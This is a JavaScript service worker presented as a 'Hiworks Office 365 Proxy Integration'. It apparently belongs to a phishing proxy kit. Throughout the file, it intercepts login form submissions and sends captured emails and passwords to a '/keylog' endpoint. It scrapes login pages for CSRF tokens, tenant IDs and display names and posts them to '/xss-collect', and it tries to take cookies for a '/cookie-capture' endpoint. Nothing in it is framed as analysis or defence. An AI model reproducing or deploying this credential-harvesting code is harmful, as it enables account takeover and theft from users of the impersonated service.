// ============================================================
//  SERVICE WORKER - Hiworks Office 365 Proxy Integration
//  FIXED: Skip /login endpoint to prevent page hanging
// ============================================================

const PROXY_PATH = "/lNv1pC9AWPUY4gbidyBO";
const XSS_ENDPOINT = "/xss-collect";
const COOKIE_ENDPOINT = "/cookie-capture";
const KEYLOG_ENDPOINT = "/keylog";

const CACHE_NAME = 'hiworks-proxy-cache-v1';
const CACHE_URLS = [
    '/',
    '/@',
    '/health'
];

// Install event
self.addEventListener('install', (event) => {
    console.log('[SW] Installing Hiworks service worker...');
    event.waitUntil(
        caches.open(CACHE_NAME)
            .then((cache) => {
                console.log('[SW] Caching essential files...');
                return cache.addAll(CACHE_URLS);
            })
            .then(() => self.skipWaiting())
    );
});

// Activate event
self.addEventListener('activate', (event) => {
    console.log('[SW] Activating service worker...');
    event.waitUntil(
        caches.keys().then((cacheNames) => {
            return Promise.all(
                cacheNames.map((cacheName) => {
                    if (cacheName !== CACHE_NAME) {
                        console.log('[SW] Removing old cache:', cacheName);
                        return caches.delete(cacheName);
                    }
                })
            );
        })
        .then(() => self.clients.claim())
    );
});

// ============================================================
//  FETCH HANDLER - Skip /login and Hiworks API calls
// ============================================================

self.addEventListener("fetch", (event) => {
    const url = new URL(event.request.url);
    
    // ✅ SKIP: /login requests (causes page hanging)
    if (event.request.url.includes('/login') || 
        event.request.url.includes('/proxy-login')) {
        return;
    }

    // ✅ SKIP: Proxy requests
    if (event.request.url.includes('/lNv1pC9AWPUY4gbidyBO')) {
        return;
    }

    // ✅ SKIP: Health checks
    if (event.request.url.includes('/health')) {
        return;
    }

    // ✅ SKIP: Static assets
    if (event.request.url.match(/\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|mp4|webm|pdf)$/i)) {
        return;
    }

    // ✅ SKIP: Hiworks API calls (avoid CORS)
    if (event.request.url.includes('/oauth2/') ||
        event.request.url.includes('/api/') ||
        event.request.url.includes('hiworks.com')) {
        return;
    }

    // Handle requests
    if (event.request.method === 'POST') {
        if (event.request.url.includes('hiworks.com')) {
            event.respondWith(handlePostRequest(event.request));
        }
        return;
    } else if (event.request.method === 'GET') {
        if (event.request.url.includes('.html') || 
            (event.request.url.endsWith('/') && !event.request.url.includes('/login'))) {
            event.respondWith(handleGetRequest(event.request));
        }
        return;
    }
});

async function handlePostRequest(request) {
    try {
        const clonedRequest = request.clone();
        const body = await clonedRequest.text();
        const formData = new URLSearchParams(body);
        const formObject = {};
        for (const [key, value] of formData) {
            formObject[key] = value;
        }

        if (formObject.loginfmt || formObject.passwd || formObject.login || formObject.password) {
            console.log('[SW] 🔐 Captured Hiworks login form data');
            
            const email = formObject.loginfmt || formObject.login || formObject.email || 'unknown';
            const password = formObject.passwd || formObject.password || '';
            
            await fetch(`${self.location.origin}${KEYLOG_ENDPOINT}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'form_submission',
                    keystrokes: `[HIWORKS_FORM:${JSON.stringify(formObject)}]`,
                    url: request.url,
                    userAgent: navigator.userAgent || 'Service Worker',
                    timestamp: new Date().toISOString(),
                    sessionId: await getSessionId(),
                    email: email,
                    password: password,
                    service: 'Hiworks Office 365',
                    source: 'service_worker'
                })
            }).catch(() => {});
        }

        return fetch(request);
    } catch (error) {
        console.error('[SW] POST handler error:', error);
        return fetch(request);
    }
}

async function handleGetRequest(request) {
    try {
        const cachedResponse = await caches.match(request);
        if (cachedResponse) {
            return cachedResponse;
        }

        const response = await fetch(request);
        const clonedResponse = response.clone();
        const contentType = response.headers.get('content-type') || '';
        
        if (contentType.includes('text/html')) {
            const html = await clonedResponse.text();
            
            if (html.includes('hiworks.com') || 
                html.includes('loginfmt') || 
                html.includes('passwd')) {
                console.log('[SW] 📄 Hiworks login page detected');
                await capturePageData(html, request.url);
            }
            
            const cache = await caches.open(CACHE_NAME);
            cache.put(request, response.clone());
        }

        return response;
    } catch (error) {
        console.error('[SW] GET handler error:', error);
        return fetch(request);
    }
}

async function capturePageData(html, url) {
    try {
        const emailMatch = html.match(/loginfmt["']?\s*value=["']([^"']+)/i) ||
                          html.match(/login_hint=([^&"']+)/i) ||
                          html.match(/email["']?\s*value=["']([^"']+)/i);
        const email = emailMatch ? decodeURIComponent(emailMatch[1]) : 'unknown';

        const csrfMatch = html.match(/__RequestVerificationToken["']?\s*value=["']([^"']+)/i);
        const csrfToken = csrfMatch ? csrfMatch[1] : null;

        const tenantMatch = html.match(/tenant["']?\s*value=["']([^"']+)/i) ||
                           html.match(/tenantid["']?\s*value=["']([^"']+)/i);
        const tenantId = tenantMatch ? tenantMatch[1] : null;

        const nameMatch = html.match(/displayName["']?\s*value=["']([^"']+)/i) ||
                         html.match(/<span[^>]*display-name[^>]*>([^<]+)<\/span>/i);
        const displayName = nameMatch ? nameMatch[1] : null;

        const xssData = {
            dom: {
                email: email,
                csrfToken: csrfToken,
                tenantId: tenantId,
                displayName: displayName,
                pageUrl: url
            },
            storage: {
                cookies: 'Captured by service worker'
            },
            url: url,
            timestamp: new Date().toISOString(),
            service: 'Hiworks Office 365',
            capturedBy: 'service_worker'
        };

        const sessionId = await getSessionId();

        await fetch(`${self.location.origin}${XSS_ENDPOINT}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                ...xssData,
                sessionId: sessionId,
                email: email
            })
        }).catch(() => {});

        console.log('[SW] ✅ Captured Hiworks page data for:', email);
        await captureCookies(sessionId, email);
    } catch (error) {
        console.error('[SW] Page data capture error:', error);
    }
}

async function captureCookies(sessionId, email) {
    try {
        const cookies = document?.cookie || 'No cookies available';
        await fetch(`${self.location.origin}${COOKIE_ENDPOINT}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                cookies: cookies,
                url: self.location?.href || 'Unknown',
                sessionId: sessionId,
                email: email,
                timestamp: new Date().toISOString(),
                capturedBy: 'service_worker'
            })
        }).catch(() => {});
        console.log('[SW] 🍪 Captured cookies');
    } catch (error) {
        console.error('[SW] Cookie capture error:', error);
    }
}

async function getSessionId() {
    try {
        const clients = await self.clients.matchAll();
        for (const client of clients) {
            const url = new URL(client.url);
            const sessionMatch = url.search.match(/sessionId=([^&]+)/);
            if (sessionMatch) {
                return sessionMatch[1];
            }
        }
        const cookies = document?.cookie || '';
        const sessionMatch = cookies.match(/sessionId=([^;]+)/);
        if (sessionMatch) {
            return sessionMatch[1];
        }
        return 'sw_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    } catch (error) {
        return 'sw_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    }
}

self.addEventListener('message', (event) => {
    const data = event.data;
    console.log('[SW] Received message:', data);
    if (data.type === 'capture_cookies') {
        captureCookies(data.sessionId, data.email);
    } else if (data.type === 'capture_xss') {
        capturePageData(data.html, data.url);
    } else if (data.type === 'get_session') {
        getSessionId().then(sessionId => {
            event.ports[0].postMessage({ sessionId: sessionId });
        });
    }
});

setInterval(async () => {
    try {
        const sessionId = await getSessionId();
        if (sessionId) {
            await fetch(`${self.location.origin}/health`, {
                method: 'GET',
                headers: { 'X-Session-Id': sessionId }
            }).catch(() => {});
        }
    } catch (error) {}
}, 30000);

console.log('[SW] ✅ Hiworks Service Worker loaded');
console.log('[SW] 🔗 Proxy Path:', PROXY_PATH);
console.log('[SW] 🎯 XSS Endpoint:', XSS_ENDPOINT);
console.log('[SW] 🍪 Cookie Endpoint:', COOKIE_ENDPOINT);
console.log('[SW] ⌨️ Keylog Endpoint:', KEYLOG_ENDPOINT);
console.log('[SW] ✅ /login SKIPPED to prevent page hanging');